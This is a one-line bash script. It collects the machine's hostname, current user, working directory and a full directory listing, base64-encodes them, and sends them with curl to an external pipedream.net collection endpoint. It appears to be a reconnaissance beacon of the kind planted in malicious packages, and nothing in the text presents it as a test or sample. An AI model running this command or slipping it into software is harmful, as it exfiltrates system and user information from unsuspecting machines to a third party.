#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://en442373creot7t.m.pipedream.net
